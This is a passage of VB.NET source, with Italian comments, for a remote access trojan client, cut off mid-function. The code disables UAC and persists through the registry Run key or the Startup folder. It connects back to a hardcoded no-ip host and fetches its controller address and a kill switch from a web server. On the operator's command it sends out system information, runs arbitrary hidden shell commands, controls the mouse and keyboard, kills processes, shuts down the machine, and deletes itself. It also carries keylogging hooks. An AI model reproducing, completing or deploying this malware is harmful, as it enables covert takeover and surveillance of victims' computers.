Imports System.Net.Sockets 'Importo il namespace System.Net.Sockets
Imports System.Text.UTF8Encoding 'Importo il namespace System.Text.UTF8Encoding per la codifica dei dati
Imports System.Net 'Importo il namespace System.Net per la gestione degli IP
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Diagnostics
Imports System.Drawing.Imaging
Imports System.Text
Imports Microsoft.Win32
Imports System.Timers

Public Class frmMain
    Public client As TcpClient 'Creo un Client TCP
    Public netstream As NetworkStream 'Creo uno stream per inviare e ricevere dati
    Dim ExIpVar As String
    Private m_PerformanceCounter As New  _
        System.Diagnostics.PerformanceCounter( _
            "Processor", "% Processor Time", "_Total")
    Dim Temp() As Process

    Public Delegate Function CallBack(ByVal hwnd As Integer, ByVal lParam As Integer) As Boolean
    Public Declare Function EnumWindows Lib "user32" (ByVal Adress As CallBack, ByVal y As Integer) As Integer
    Public Declare Function IsWindowVisible Lib "user32.dll" (ByVal hwnd As IntPtr) As Boolean
    Private Const SW_HIDE As Integer = 0
    Private Const SW_RESTORE As Integer = 9
    Private hWnd As Integer
    Public selectedIndex As Integer
    Private ActiveWindows As New System.Collections.ObjectModel.Collection(Of IntPtr)
    <DllImport("User32")> Private Shared Function ShowWindow(ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
    End Function
    Dim TestoFin As String
    Const GW_HWNDNEXT As Integer = 2
    Private Declare Function apiGetWindow Lib "user32" Alias "GetWindow" (ByVal hwnd As Integer, ByVal wCmd As Integer) As Integer
    Private Declare Function apiGetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Integer, ByVal lpString As String, ByVal cch As Integer) As Integer
    Private Declare Function apiGetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Integer) As Integer
    Private Declare Function apiGetTopWindow Lib "user32" Alias "GetTopWindow" (ByVal hwnd As Integer) As Integer
    Private Declare Function apiGetDesktopWindow Lib "user32" Alias "GetDesktopWindow" () As Integer
    Private Declare Function apiShowOwnedPopups Lib "user32" Alias "ShowOwnedPopups" (ByVal hWnd As Integer, ByVal fShow As Integer) As Integer
    Private Declare Function apiAnyPopup Lib "user32" Alias "AnyPopup" () As Integer
    Private Declare Function apiGetLastActivePopup Lib "user32" Alias "GetLastActivePopup" (ByVal hWndOwnder As Integer) As Integer
    Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As IntPtr, ByVal cmd As Integer) As Boolean
    Dim clientschermo As TcpClient
    Dim netstreamschermo As NetworkStream
    Dim bufferimmag() As Byte
    Dim lbytes As Long
    Public Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
    Public Const MOUSEEVENTF_LEFTDOWN = &H2 ' left button down
    Public Const MOUSEEVENTF_LEFTUP = &H4 ' left button up
    Public Const MOUSEEVENTF_MIDDLEDOWN = &H20 ' middle button down
    Public Const MOUSEEVENTF_MIDDLEUP = &H40 ' middle button up
    Public Const MOUSEEVENTF_RIGHTDOWN = &H8 ' right button down
    Public Const MOUSEEVENTF_RIGHTUP = &H10 ' right button up
    'dimensioni  originali
    Dim originalX As Integer
    Dim originalY As Integer
    'dimensioni finali
    Dim destinationX As Integer
    Dim destinationY As Integer
    'cartella e nome di destinazione
    Dim destinationFolder As String
    Dim destinationFileName As String
    Dim bm As Bitmap
    Public XYim As String
    Public TextToPrint As String
    Public TextColor As Color
    Public TextFont As Font
    Dim txtFileEDir As String
    Dim Dvs As String
    Dim BoxS32 As String
    Dim clientdow As TcpClient
    Dim netstreamdow As NetworkStream
    Dim FileNameDow As String
    Dim FileData() As Byte
    Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Dim ImageStyle As Integer = 2 ' Stile della visualizzazione dell'immagine
    Dim clientup As TcpClient
    Dim netstreamup As NetworkStream
    Dim ByArrUp As Integer
    Dim ByArrUpTot As Integer
    Dim AvvFiUpp As Boolean = False
    Dim PathToOpenF() As String
    Dim clientweb As TcpClient
    Dim netstreamweb As NetworkStream
    Public Dev3 As Integer = 0
    Public HPazzo As Integer
    Dim ListaMacBew As String
    Dim bufferimmagw() As Byte
    Dim lbytesw As Long
    Public XYimw As String
    'dimensioni  originali
    Dim originalX2 As Integer
    Dim originalY2 As Integer
    'dimensioni finali
    Dim destinationX2 As Integer
    Dim destinationY2 As Integer
    'cartella e nome di destinazione
    Dim destinationFolder2 As String
    Dim destinationFileName2 As String
    Dim bm2 As Bitmap
    Dim PerWe As String = "|O%|h" & 30
    Dim clientkey As TcpClient
    Dim netstreamkey As NetworkStream
    Dim instkoff As Boolean = False
    Public Na1 As String
    Public Na2 As String
    Dim clientSD As TcpClient
    Dim netstreamSD As NetworkStream
    Dim BySD() As Byte
    Dim SoWav As String

#Region "API Functions And Structures"
    Dim TSTOT As String
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
#End Region
    Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Declare Function GetWindowText Lib "user32.dll" _
    Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, _
    ByVal cch As Int32) As Int32
    Dim Stringa As String = New String(Chr(0), 100)
    Dim Lettura2 As String
    Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Dim VarS As Boolean = False
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function
    Const WM_APPCOMMAND As UInteger = &H319
    Const APPCOMMAND_VOLUME_UP As UInteger = &HA
    Const APPCOMMAND_VOLUME_DOWN As UInteger = &H9
    Const APPCOMMAND_VOLUME_MUTE As UInteger = &H8
    Dim NumFor As Integer
    Dim U As String
    Dim byfllo As String
    Dim COM As String
    Private RESL As String
    Private Delegate Sub delUpdate()
    Dim mioP As New Process
    Dim StaInf As New System.Diagnostics.ProcessStartInfo
    Dim CMOUT As String
    Dim keyUa As RegistryKey
    Dim NK As String = "SystemStart"
    Dim IsFNIAtt As Boolean = False
    Dim IpAd As String = "gicopiro.no-ip.biz"
    Dim row3000 As String
    Dim Ugo As Integer
    Dim ktype As String = "En"
    Dim FiByK() As Byte
    Public isconn As Boolean
    Dim ugomatteomattia(0) As Byte
    Dim pg As Integer
    Dim ps As Integer
    Dim pw As Integer
    Dim pu As Integer
    Dim pdw As Integer
    Dim pSD As Integer
    Dim pKey As Integer
    Dim attok As Boolean = False
    Private Sub frmMain_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load



        If AlreadyRunning_Almost() Then
            End
        End If


        Try
            Dim fileReader As System.IO.StreamReader
            fileReader = _
            My.Computer.FileSystem.OpenTextFileReader(Environ("TEMP") & "\SystemSettings.txt")
            Dim LettoPazzo As String
            LettoPazzo = fileReader.ReadToEnd
            fileReader.Close()



            pg = Split(LettoPazzo, vbCrLf)(0)
            ps = Split(LettoPazzo, vbCrLf)(1)
            pw = Split(LettoPazzo, vbCrLf)(2)
            pu = Split(LettoPazzo, vbCrLf)(3)
            pdw = Split(LettoPazzo, vbCrLf)(4)
            pSD = Split(LettoPazzo, vbCrLf)(5)
            pKey = Split(LettoPazzo, vbCrLf)(6)
            NK = Split(LettoPazzo, vbCrLf)(7)
            ktype = Split(LettoPazzo, vbCrLf)(8)

            If Split(LettoPazzo, vbCrLf)(9) = "True" Then
                IsFNIAtt = True
            End If

        Catch ex As Exception
        End Try

        

        Try
            Dim req As HttpWebRequest = WebRequest.Create("http://gicopico.altervista.org/IP.php")
            Dim res As HttpWebResponse = req.GetResponse()
            Dim Stream As Stream = res.GetResponseStream()
            Dim sr As StreamReader = New StreamReader(Stream)
            ExIpVar = sr.ReadToEnd()

            If ExIpVar = "DIS" Then
                MsgBox("Ciao, il programma che hai attivato è un software che serve per controllare un computer a distanza," & vbCrLf &
                    "se stai leggendo questo messaggio è perchè il programma è stato disattivato per essere stato distribuito illegalmente" & vbCrLf &
                    "e senza il permesso dell'autore (io). Il programma ora è disattivo ed inutilizzabile ! -Buona Giornata- GicoPiro", MsgBoxStyle.Critical, "Error")

                Shell("cmd.exe " & "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath, vbHide)
                End
            End If

            If IsFNIAtt = True Then
                Dim req23 As HttpWebRequest = WebRequest.Create("http://gicopico.altervista.org/fnp.txt")
                Dim res23 As HttpWebResponse = req23.GetResponse()
                Dim Stream23 As Stream = res23.GetResponseStream()
                Dim sr23 As StreamReader = New StreamReader(Stream23)
                IpAd = sr23.ReadToEnd()
            End If

        Catch ex As Exception
        End Try

        Try
            Dim rgKy As RegistryKey
            Dim ebiellu As Decimal
            Dim cheistu As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
            rgKy = Registry.LocalMachine.OpenSubKey(cheistu, True)
            ebiellu = rgKy.GetValue("EnableLUA", 0.0)
            If ebiellu = 1.0 Then
                rgKy.SetValue("EnableLUA", 0)
            End If
            rgKy.Close()
        Catch ex As Exception
        End Try

        Try
            If My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").GetValue(NK, Nothing) Is Nothing Then
                Dim key2 As Microsoft.Win32.RegistryKey = _
                           My.Computer.Registry.CurrentUser.OpenSubKey( _
                           "Software\Microsoft\Windows\CurrentVersion\Run", _
                           True)

                key2.SetValue( _
                          NK, _
                         Application.ExecutablePath, _
                           Microsoft.Win32.RegistryValueKind.String)

            End If

        Catch ex As Exception

            Try
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup), FileAttributes.Hidden)
            Catch ec As Exception
            End Try
        End Try

        Try
            If Dir(Environ("TEMP") & "\WinfileLog.txt") <> "" Then
                Dim myFileStream2 As FileStream
                Dim myStreamReader2 As StreamReader

                Lettura2 = ""
                myFileStream2 = New FileStream(Environ("TEMP") & "\WinfileLog.txt", FileMode.Open, FileAccess.Read, FileShare.Read)
                myStreamReader2 = New StreamReader(myFileStream2)

                Do While myStreamReader2.Peek >= 0
                    Lettura2 = Lettura2 & myStreamReader2.ReadLine
                Loop
                myStreamReader2.Close()
                myStreamReader2.Close()
                instkoff = True
                tmrK.Enabled = True
            End If

        Catch ex As Exception
        End Try

        client = New TcpClient 'Assegno un istanza al client principale
        clientschermo = New TcpClient
        clientdow = New TcpClient
        clientup = New TcpClient
        clientweb = New TcpClient
        clientkey = New TcpClient
        clientSD = New TcpClient
        Connessione() 'Richiamo la sub Connessione
    End Sub

    Sub Connessione()
        Try 'Gestione errori
            client.Connect(IpAd, pg) 'Mi connetto sull'IP e sulla porta scritti
            netstream = client.GetStream 'Assegno lo stream uguale ai dati ricevuti dal client
            If client.Connected = True Then 'Verifico se la connessione è riuscita
                Dim Datidai() As Byte = UTF8.GetBytes("<Conne>" & Environ("USERNAME") & "<->" & ExIpVar & "<->" & TimeOfDay & "<->" & Path.GetFileName(Application.ExecutablePath) & " {1.0}") 'Metto in un array di byte le varie info del PC codificate e separate da <->
                netstream.Write(Datidai, 0, Datidai.Length) 'Immetto nel flusso i dati
                isconn = True
                tmrDati.Enabled = True
            End If

        Catch ex As Exception 'Se la connessione non è riuscita
            Connessione() 'Provo a ricollegarmi
        End Try
    End Sub

    Private Sub tmrDati_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDati.Tick
        If isconn = True Then 'Verifico se il client è connesso
            If client.Available > 0 Then 'Verifico se riceve dati
                If attok = True Then
                    tmrLusso.Enabled = False
                End If
                Try
                    Dim buffer(client.Available - 1) As Byte 'Dichiaro un array di byte di dimensione pari ai dai arrivati
                    netstream.Read(buffer, 0, buffer.Length) 'Leggo i dati

                    Dim Datia As String = UTF8.GetString(buffer) 'Ricodifico i dati arrivati in string e li metto in una variabile (Datia)

                    frmTahc.cmdSendMR.Enabled = False

                    If InStr(Datia, "A<tt@") Then
                        Datia = ""
                        tmrLusso.Enabled = True
                        attok = True
                    End If


                    If InStr(Datia, "<Low>") Then 'Verifico se Datia è uguale a <Low>
                        Datia = ""
                        End 'Chiudo l'applicazione
                    End If

                    If InStr(Datia, "<RES>") Then
                        Datia = ""
                        Application.Restart()
                    End If

                    If InStr(Datia, "|Un|") Then
                        Datia = ""
                        Try
                            Dim rgKy2 As RegistryKey
                            Dim ebiellu2 As Decimal
                            Dim cheistu2 As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
                            rgKy2 = Registry.LocalMachine.OpenSubKey(cheistu2, True)
                            ebiellu2 = rgKy2.GetValue("EnableLUA", 0.0)
                            If ebiellu2 = 0.0 Then
                                rgKy2.SetValue("EnableLUA", 1)
                            End If
                            rgKy2.Close()
                        Catch ex As Exception
                        End Try
                        If My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").GetValue(NK, Nothing) IsNot Nothing Then
                            Dim key3 As Microsoft.Win32.RegistryKey = _
                                       My.Computer.Registry.CurrentUser.OpenSubKey( _
                                       "Software\Microsoft\Windows\CurrentVersion\Run", _
                                       True)

                            key3.DeleteValue(NK)
                        End If
                        Shell("cmd.exe " & "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath, vbHide)
                        End
                    End If


                    If InStr(Datia, "|Un2|") Then
                        Datia = ""
                        Try
                            Dim rgKy2 As RegistryKey
                            Dim ebiellu2 As Decimal
                            Dim cheistu2 As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
                            rgKy2 = Registry.LocalMachine.OpenSubKey(cheistu2, True)
                            ebiellu2 = rgKy2.GetValue("EnableLUA", 0.0)
                            If ebiellu2 = 0.0 Then
                                rgKy2.SetValue("EnableLUA", 1)
                            End If
                            rgKy2.Close()
                        Catch ex As Exception
                        End Try

                        If My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").GetValue(NK, Nothing) IsNot Nothing Then
                            Dim key3 As Microsoft.Win32.RegistryKey = _
                                       My.Computer.Registry.CurrentUser.OpenSubKey( _
                                       "Software\Microsoft\Windows\CurrentVersion\Run", _
                                       True)

                            key3.DeleteValue(NK)
                        End If

                    End If


                    If InStr(Datia, "<SendInfo>") Then
                        Datia = ""
                        txtInfo.Text = "<{INf}>" & "OS Version: " & Environment.OSVersion.ToString & vbCrLf
                        txtInfo.Text = txtInfo.Text & "User name: " & Environment.UserName.ToString & vbCrLf
                        txtInfo.Text = txtInfo.Text & "Version: " & Environment.Version.ToString & vbCrLf
                        txtInfo.Text = txtInfo.Text & "Time: " & TimeOfDay & vbCrLf
                        txtInfo.Text = txtInfo.Text & "System Dir: " & Environment.SystemDirectory.ToString & vbCrLf
                        txtInfo.Text = txtInfo.Text & "Current Dir: " & Environment.CurrentDirectory.ToString & vbCrLf

                        Try
                            Dim rk As RegistryKey = Registry.LocalMachine
                            rk = rk.OpenSubKey("hardware\\description\\system\\centralprocessor\\0")
                            Dim valr As Object = rk.GetValue("ProcessorNameString")
                            txtInfo.Text = txtInfo.Text & "Processor name: " & valr & vbCrLf
                        Catch ex As Exception
                            txtInfo.Text = txtInfo.Text & "Processor name: " & "UNABLE TO READ"
                        End Try

                        Try
                            txtInfo.Text = txtInfo.Text & "Windows Product ID: " & My.Computer.Registry.GetValue(
                                "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "Productid", Nothing) & vbCrLf
                        Catch ex As Exception
                            txtInfo.Text = txtInfo.Text & "Windows Product ID: " & "UNABLE TO READ"
                        End Try

                        Try
                            Dim rgKy10 As RegistryKey
                            Dim ebiellu10 As Decimal
                            Dim cheistu10 As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
                            rgKy10 = Registry.LocalMachine.OpenSubKey(cheistu10, True)
                            ebiellu10 = rgKy10.GetValue("EnableLUA", 0.0)
                            If ebiellu10 = 0.0 Then
                                txtInfo.Text = txtInfo.Text & "UAC State: " & "Deactivated" & vbCrLf
                            Else
                                txtInfo.Text = txtInfo.Text & "UAC State: " & "Active" & vbCrLf
                            End If
                            rgKy10.Close()
                        Catch ex As Exception
                            txtInfo.Text = txtInfo.Text & "UAC State: " & "UNABLE TO READ"
                        End Try




                        Try
                            If My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run").GetValue(NK, Nothing) IsNot Nothing Then
                                txtInfo.Text = txtInfo.Text & "Presence on registry: " & "YES" & vbCrLf
                            Else
                                txtInfo.Text = txtInfo.Text & "Presence on registry: " & "NO" & vbCrLf
                            End If

                        Catch ex As Exception
                            txtInfo.Text = txtInfo.Text & "Presence on registry: " & "UNABLE TO READ"
                        End Try


                        'Converto da Byte a MegaByte

                        Dim drive As New IO.DriveInfo("C:\")
                        Dim spaziodisp As Long
                        Dim spazio_tot As Long
                        Dim spazio_occ As Long
                        spaziodisp = drive.AvailableFreeSpace / 1048576
                        spazio_tot = drive.TotalSize.ToString / 1048576
                        'Spazio Occupato
                        spazio_occ = spazio_tot - spaziodisp
                        txtInfo.Text = txtInfo.Text & "-C:\ Infos-" & vbCrLf
                        txtInfo.Text = txtInfo.Text & "Usable space: " & spaziodisp & " MB" & vbCrLf
                        txtInfo.Text = txtInfo.Text & "Total space: " & spazio_tot & " MB" & vbCrLf
                        txtInfo.Text = txtInfo.Text & "Space used: " & spazio_occ & " MB" & vbCrLf
                        txtInfo.Text = txtInfo.Text & "------" & vbCrLf
                        For ilogd As Integer = 0 To Environment.GetLogicalDrives.Length - 1
                            txtInfo.Text += Environment.GetLogicalDrives(ilogd)
                            txtInfo.Text += " "
                        Next ilogd

                        netstream.Write(
                    UTF8.GetBytes(txtInfo.Text), 0, UTF8.GetBytes(txtInfo.Text).Length) 'invio il comando al server
                        txtInfo.Text = ""
                    End If

                    If InStr(Datia, "<{PCClo}>") Then
                        Shell("shutdown -s")
                    End If

                    If InStr(Datia, "<[PCRI]>") Then
                        Shell("shutdown -r")
                    End If

                    If InStr(Datia, "[PClog]") Then
                        Shell("shutdown -l")
                    End If

                    If InStr(Datia, "{CPU}") Then
                        Datia = ""
                        Dim CPU As String
                        CPU = "<RC>" & CInt(m_PerformanceCounter.NextValue()) & "%"
                        netstream.Write(
                   UTF8.GetBytes(CPU), 0, UTF8.GetBytes(CPU).Length) 'invio il comando al server
                    End If

                    If InStr(Datia, "{RemP]") Then
                        Datia = ""
                        Temp = Process.GetProcesses()

                        BoxS32 = ""
                        Dim x As Integer
                        For x = 0 To Temp.Length - 1
                            If Not x = Temp.Length - 1 Then
                                BoxS32 = BoxS32 & Temp(x).ProcessName & "|<|>|" & Temp(x).Id.ToString & "|<|>|" & Temp(x).MainWindowTitle & vbCrLf
                            Else
                                BoxS32 = BoxS32 & Temp(x).ProcessName & "|<|>|" & Temp(x).Id.ToString & "|<|>|" & Temp(x).MainWindowTitle
                            End If
                        Next x
                        netstream.Write(
                        UTF8.GetBytes("/>Thpse>1" & UTF8.GetBytes(BoxS32).Length), 0, UTF8.GetBytes(
                         "/>Thpse>1" & UTF8.GetBytes(BoxS32).Length).Length) 'invio il comando al server
                        'netstream.Write(
                        'UTF8.GetBytes("<ECCOIP>" & BoxS32), 0, UTF8.GetBytes(
                        ' "<ECCOIP>" & BoxS32).Length) 'invio il comando al server
                        'BoxS32 = ""
                    End If

                    If InStr(Datia, "[<PBter>]") Then
                        Datia = Replace(Datia, "[<PBter>]", "")
                        Dim MyPros() As Process
                        Dim MyPro As Process
                        MyPros = Process.GetProcessesByName(Datia)
                        For Each MyPro In MyPros
                            MyPro.CloseMainWindow()
                        Next
                        Datia = ""
                    End If

                    If InStr(Datia, "{<]KillP") Then
                        Datia = Replace(Datia, "{<]KillP", "")
                        Dim MyPros2() As Process
                        Dim MyPro2 As Process
                        MyPros2 = Process.GetProcessesByName(Datia)
                        For Each MyPro2 In MyPros2
                            MyPro2.CloseMainWindow()
                        Next
                        Datia = ""
                    End If

                    If InStr(Datia, "|\{ATT}\|\") Then
                        Try
                            Shell(Replace(Datia, "|\{ATT}\|\", ""), AppWinStyle.NormalFocus)
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("$||ErrP>"), 0, UTF8.GetBytes("$||ErrP>").Length) 'invio il comando al server
                        End Try
                        Datia = ""

                    End If

                    If InStr(Datia, "<>>|Attma|") Then
                        Try
                            Shell(Replace(Datia, "<>>|Attma|", ""), AppWinStyle.MaximizedFocus)
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("$||ErrP>"), 0, UTF8.GetBytes("$||ErrP>").Length) 'invio il comando al server
                        End Try
                        Datia = ""
                    End If

                    If InStr(Datia, "/\><rtaaHi>") Then
                        Try
                            Shell(Replace(Datia, "/\><rtaaHi>", ""), AppWinStyle.Hide)
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("$||ErrP>"), 0, UTF8.GetBytes("$||ErrP>").Length) 'invio il comando al server
                        End Try
                        Datia = ""
                    End If

                    If InStr(Datia, "(>mm>mi>") Then
                        Try
                            Shell(Replace(Datia, "(>mm>mi>", ""), AppWinStyle.MinimizedFocus)
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("$||ErrP>"), 0, UTF8.GetBytes("$||ErrP>").Length) 'invio il comando al server
                        End Try
                        Datia = ""
                    End If

                    'If InStr(Datia, "{(-/GeTW/)}") Then
                    'Datia = ""
                    ' netstream.Write(
                    ' UTF8.GetBytes("<{WinEcco>" & GetWindows()), 0, UTF8.GetBytes(
                    '    "<{WinEcco>" & GetWindows()).Length) 'invio il comando al server
                    ' End If

                    If InStr(Datia, ">{Min}>") Then
                        Dim blabla() As Process = Process.GetProcessesByName(Replace(Datia, ">{Min}>", ""))
                        For Each pirito As Process In blabla
                            ShowWindow(pirito.MainWindowHandle, 2)
                        Next
                        Datia = ""
                    End If

                    If InStr(Datia, ">/Max|>") Then
                        Dim blabla2() As Process = Process.GetProcessesByName(Replace(Datia, ">/Max|>", ""))
                        For Each pirito2 As Process In blabla2
                            ShowWindow(pirito2.MainWindowHandle, 3)
                        Next
                        Datia = ""
                    End If

                    If InStr(Datia, "[/Rip\]") Then
                        Dim blabla3() As Process = Process.GetProcessesByName(Replace(Datia, "[/Rip\]", ""))
                        For Each pirito3 As Process In blabla3
                            ShowWindow(pirito3.MainWindowHandle, 9)
                        Next
                        Datia = ""
                    End If

                    If InStr(Datia, "{^}NasC{^}") Then
                        Dim blabla4() As Process = Process.GetProcessesByName(Replace(Datia, "{^}NasC{^}", ""))
                        For Each pirito4 As Process In blabla4
                            ShowWindow(pirito4.MainWindowHandle, 0)
                        Next
                        Datia = ""
                    End If


                    If InStr(Datia, "-AttSS}") Then
                        Datia = ""
                        tmrDatiSchermo.Enabled = False
                        tmrSchermoCl.Enabled = False
                        clientschermo.Close()
                        clientschermo = New TcpClient
                        tmrSchermoCl.Start()
                    End If

                    If InStr(Datia, "<>|XYDES") Then
                        Datia = ""
                        netstream.Write(
                   UTF8.GetBytes("|\XYDESS|\" & System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Width &
                                 "(-)" & System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Height), 0, UTF8.GetBytes(
                       "|\XYDESS|\" & System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Width &
                                 "(-)" & System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Height).Length) 'invio il comando al server
                    End If


                    If InStr(Datia, "<CCMOU|>") Then
                        Datia = Replace(Datia, "<CCMOU|>", "")
                        Try
                            Cursor.Position = New Point(Split(Datia, " , ")(0) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Width,
                                                        Split(Datia, " , ")(1) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Height)

                        Catch ex As Exception
                        End Try
                        Datia = ""

                        netstream.Write(
                    UTF8.GetBytes("<CorDamm>"), 0, UTF8.GetBytes("<CorDamm>").Length) 'invio il comando al server
                    End If

                    If InStr(Datia, "-|Clk|-") Then
                        Datia = Replace(Datia, "-|Clk|-", "")
                        Try
                            Cursor.Position = New Point(Split(Datia, " , ")(0) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Width,
                                                        Split(Datia, " , ")(1) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Height)

                        Catch ex As Exception
                        End Try
                        Datia = ""
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) ' click del mouse sinistro (giù)
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) ' click del mouse sinistro (su)
                        netstream.Write(
                   UTF8.GetBytes("<CorDamm>"), 0, UTF8.GetBytes("<CorDamm>").Length) 'invio il comando al server
                    End If

                    If InStr(Datia, "|^Rght^|") Then
                        Datia = Replace(Datia, "|^Rght^|", "")
                        Try
                            Cursor.Position = New Point(Split(Datia, " , ")(0) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Width,
                                                        Split(Datia, " , ")(1) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Height)
                        Catch ex As Exception
                        End Try
                        Datia = ""
                        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0) ' click del mouse sinistro (giù)
                        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0) ' click del mouse sinistro (su)
                        netstream.Write(
                   UTF8.GetBytes("<CorDamm>"), 0, UTF8.GetBytes("<CorDamm>").Length) 'invio il comando al server
                    End If


                    If InStr(Datia, "$DuoC$|") Then
                        Datia = Replace(Datia, "$DuoC$|", "")
                        Try
                            Cursor.Position = New Point(Split(Datia, " , ")(0) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Width,
                                                        Split(Datia, " , ")(1) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Height)
                        Catch ex As Exception
                        End Try
                        Datia = ""
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) ' click del mouse sinistro (giù)
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) ' click del mouse sinistro (su)
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) ' click del mouse sinistro (giù)
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) ' click del mouse sinistro (su)
                        netstream.Write(
                   UTF8.GetBytes("<CorDamm>"), 0, UTF8.GetBytes("<CorDamm>").Length) 'invio il comando al server
                    End If


                    If InStr(Datia, "<T|e :n/^") Then
                        Datia = Replace(Datia, "<T|e :n/^", "")
                        Try
                            Cursor.Position = New Point(Split(Datia, " , ")(0) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Width,
                                                        Split(Datia, " , ")(1) * System.Windows.Forms.SystemInformation.PrimaryMonitorSize.Height)
                        Catch ex As Exception
                        End Try
                        Datia = ""
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) ' click del mouse sinistro (giù)
                        netstream.Write(
                   UTF8.GetBytes("<CorDamm>"), 0, UTF8.GetBytes("<CorDamm>").Length) 'invio il comando al server
                    End If


                    If InStr(Datia, "ResIm") Then
                        XYim = Replace(Datia, "ResIm", "")
                        Datia = ""
                    End If

                    If InStr(Datia, "NIb") Then
                        XYim = ""
                        Datia = ""
                    End If


                    If InStr(Datia, "|#ã#|") Then
                        Dim REPSEND As String = Replace(Datia, "|#ã#|", "")

                        Datia = ""

                        If REPSEND = "╔" Then
                            SendKeys.Send("{ENTER}")
                        End If

                        If REPSEND = "▒" Then
                            SendKeys.Send("{BACKSPACE}")
                        End If

                        If REPSEND <> "╔" Then

                            If REPSEND <> "▒" Then
                                My.Computer.Keyboard.SendKeys(REPSEND)
                            End If

                        End If



                        netstream.Write(
                        UTF8.GetBytes("|#ã#|"), 0, UTF8.GetBytes("|#ã#|").Length) 'invio il comando al server

                    End If

                    'If InStr(Datia, "|en|") Then
                    'Datia = ""
                    'SendKeys.Send("{ENTER}")
                    'End If

                    'If InStr(Datia, "|bk|") Then
                    'Datia = ""
                    'SendKeys.Send("{BACKSPACE}")
                    'End If

                    If InStr(Datia, " <óÔIÂy> ") Then
                        TextToPrint = Replace(Datia, " <óÔIÂy> ", "")
                        Datia = ""
                        pd.Print()
                    End If

                    If InStr(Datia, "<|óð1╠à½|>") Then
                        frmStampaDesk.Show()
                        frmStampaDesk.lblTSSD.Text = Replace(Datia, "<|óð1╠à½|>", "")
                        Datia = ""
                    End If

                    If InStr(Datia, "╠à½|") Then
                        Datia = ""
                        frmStampaDesk.Close()
                    End If

                    If InStr(Datia, "!úVDiR♫!") Then
                        txtFileEDir = ""
                        Datia = ""
                        Dvs = ""
                        For ipo As Integer = 0 To Environment.GetLogicalDrives.Length - 1
                            Dvs += Environment.GetLogicalDrives(ipo)
                            Dvs += " +-+ "
                        Next ipo
                        netstream.Write(
                   UTF8.GetBytes("<Ok°ÁDriver>" & UTF8.GetBytes(Dvs).Length), 0, UTF8.GetBytes("<Ok°ÁDriver>" &
                                                                                                            UTF8.GetBytes(Dvs).Length).Length) 'invio il comando al server
                        'netstream.Write(
                        'UTF8.GetBytes("<êó°ÁDr>" & Dvs), 0, UTF8.GetBytes("<êó°ÁDr>" & Dvs).Length) 'invio il comando al server
                    End If

                    If InStr(Datia, "☼ä%Ìè") Then

                        txtFileEDir = ""
                        Dvs = ""
                        Try
                            Datia = Replace(Datia, "☼ä%Ìè", "")
                            Dim strFileSize As String = ""
